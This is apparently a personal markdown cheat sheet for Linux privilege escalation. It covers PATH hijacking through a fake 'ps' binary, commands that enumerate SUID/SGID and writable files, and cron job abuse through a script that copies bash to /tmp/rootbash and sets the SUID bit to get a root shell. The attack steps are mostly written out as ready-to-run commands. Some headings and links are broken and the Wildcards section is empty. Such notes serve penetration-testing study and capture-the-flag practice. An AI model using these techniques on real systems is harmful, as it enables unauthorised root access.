- [PATH Variable](#PATH Variable)
- [SUID/SGID](#SUID/SGID)
- [CRONJOB(#Cronjob)
- []()
- []()
- []()
- []()
- []()
- []()
--------------------------------------------------------------------------------------------------------------------------------
# PATH Variable

#### Check the PATH
```
echo $PATH
```

#### case study one
- Binary file with SUID permission
  - check what the file do
  - for example *which linux commad use*
    - in our case we use *ps* command
- Create malicious file
  - echo "/bin/bash" or "/bin/sh" > /tmp/ps
  - chmod 777 /tmp/ps
  - *OR*
  - cp /bin/sh /tmp/ps
  - *OR*
  - ln -s /bin/sh /tmp/ps
    - export PATH=.:$PATH
- check PATH
  - echo $PATH
- change $PATH (add tmp folder)
  - export PATH=/tmp:$PATH
- run SUID binary
--------------------------------------------------------------------------------------------------------------------------------
# SUID/SGID
- SUID: executed with the privileges of the file owner
- SGID: executed with the privileges of the file group

#### Searching SUID file (SUID file is a special type of file permission given to a file
- find / -perm -u=s -type f 2>/dev/null
- find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} ; 2> /dev/null
- find / -perm -4000 -type f 2>/dev/null
- find / -uid 0 -perm -4000 -type f 2>/dev/null
- find / -type f -perm -g+s -exec ls -ald {} \; 2>/dev/null
- find / -user root -perm -002 -type f -not -path "/" 2>/dev/null
- find / -writable -type f 2>/dev/null>

### tip 'check suid/sgid files data'

#### Use strace for track suid file execute
```
strace /suid/file/path 2>&1 | grep -iE "open|access|no such file"
strace -v -f -e execve /suid/file/path 2>&1 | grep service
```
--------------------------------------------------------------------------------------------------------------------------------
# Cronjobs 
- crontab -l
- ls -alh /var/spool/cron
- ls -alh /var/spool/crontabs
- ls -al /etc/ | grep cron
- ls -al /etc/cron*
- ls -alh -R /etc/cron*

#### PATH Environment Variable
```
crontab *PATH* env variable is by default set to /usr/bin:/bin
The PATH variable can be overwritten in the crontab file
If the cron job progam/script does not use an absolute path and one of the PATH directories is wrtietable by our user, we my be able to crete a program/script with the same name as the cron job
```

#### PATH Environment Variable case study
```
for PATH=/home/user
create file in /home/user
content: 
 #!/bin/bash
 cp /bin/bash /tmp/rootbash
 chmod +s /tmp/rootbash
 chmod +s file.sh
 
 wait: watch -n 1 ls -l /tmp
```

#### Wildcards
--------------------------------------------------------------------------------------------------------------------------------
